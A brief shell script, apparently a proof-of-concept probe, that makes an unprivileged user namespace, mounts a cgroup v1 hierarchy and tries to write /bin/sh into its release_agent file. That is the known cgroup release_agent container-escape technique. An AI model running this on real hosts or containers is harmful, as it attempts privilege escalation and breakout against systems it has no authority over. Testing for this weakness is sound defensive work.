#!/bin/sh
set +e
mkdir -p /tmp/cg
unshare -Ur -m sh -c 'mount -t cgroup -o none,name=x cgroup /tmp/cg; echo mount_rc=$?; ls -la /tmp/cg | head; printf /bin/sh > /tmp/cg/release_agent; echo write_rc=$?; cat /tmp/cg/release_agent'
